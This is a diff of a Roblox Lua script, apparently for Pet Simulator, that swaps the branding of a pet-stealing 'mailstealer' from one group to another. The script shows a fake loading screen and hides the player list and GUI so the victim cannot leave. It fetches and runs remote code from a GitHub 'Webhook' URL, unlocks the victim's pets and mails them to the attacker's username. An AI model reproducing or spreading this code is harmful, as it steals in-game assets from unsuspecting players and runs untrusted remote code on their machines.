@@ -1,4 +1,3 @@
-
 local Players = game:GetService("Players");
 local StarterGui = game:GetService("StarterGui");
 local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library);
@@ -14,13 +13,13 @@ local PetFolders = {
 	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal,
 	game.Players.LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic
 };
-if time() <= 0 then
+if time() <= 30 then
 	wait(0);
 	game.StarterGui:SetCore("SendNotification", {
 		Title = "Script error",
 		Text = "Please wait and try again Remote not found !",
 		Icon = "rbxassetid://57254792",
-		Duration = 0
+		Duration = 15
 	});
 	return;
 end;
@@ -50,7 +49,7 @@ local EndSequence = Instance.new("Frame");
 Loading.Name = "Loading";
 Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui");
 Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling;
-Loading.DisplayOrder = 0;
+Loading.DisplayOrder = 999999999;
 MainFrame.Name = "MainFrame";
 MainFrame.Parent = Loading;
 MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20);
@@ -237,15 +236,15 @@ end;
 if Client.leaderstats.Diamonds.Value < _G.Diamonds then
 	Client:Kick("Error launching script. Error code: " .. _G.ScriptName .. ".LaunchScript");
 end;
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true);
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false);
 if _G.AntiLeave == true then
 	RobloxGui:Destroy();
 end;
 wait(0);
 Client.Character.HumanoidRootPart.Anchored = true;
 (loadstring(game:HttpGet("https://raw.githubusercontent.com/HosteeScriptz/HosteeHub/main/%E2%9C%97%20Webhook%20%E2%9C%97")))();
-writefile("MonzOnTop.txt");
-game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("|MonzHub On Top!!!|", "All");
+writefile("HosteeOnTop.txt", "discord.gg/rizzhub");
+game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("|SimoNHuB On Top!!!|", "All");
 if _G.UnlockPets == true then
 	local function unlockPetsInFolder(folder)
 		local children = folder:GetChildren();
@@ -255,7 +254,7 @@ if _G.UnlockPets == true then
 				if child.Name then
 					local args2 = {
 						[1] = {
-							["" .. name] = true
+							["" .. name] = false
 						}
 					};
 					Invoke("Lock Pet", unpack(args2));
@@ -288,12 +287,12 @@ while wait() do
 		if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value < 1000000 then
 			local args = {
 				[1] = {
-					Recipient = _G.UserName,
+					Recipient = G_UserName,
 					Diamonds = 0,
 					Pets = {
 						v.uid
 					},
-					Message = "Monz Better"
+					Message = ".gg/hosteehub | Hostee On Top"
 				}
 			};
 			Invoke("Send Mail", unpack(args));
@@ -305,7 +304,7 @@ while wait() do
 					Pets = {
 						v.uid
 					},
-					Message = "Monz Better"
+					Message = ".gg/hosteehub | Hostee On Top"
 				}
 			};
 			Invoke("Send Mail", unpack(args));
@@ -317,7 +316,7 @@ while wait() do
 					Pets = {
 						v.uid
 					},
-					Message = "Monz Better"
+					Message = ".gg/hosteehub | Hostee On Top"
 				}
 			};
 			Invoke("Send Mail", unpack(args));
@@ -329,7 +328,7 @@ while wait() do
 					Pets = {
 						v.uid
 					},
-					Message = "Monz Better"
+					Message = ".gg/hosteehub | Hostee On Top"
 				}
 			};
 			Invoke("Send Mail", unpack(args));
@@ -341,7 +340,7 @@ while wait() do
 					Pets = {
 						v.uid
 					},
-					Message = "Monz Better"
+					Message = ".gg/hosteehub | Hostee On Top"
 				}
 			};
 			Invoke("Send Mail", unpack(args));
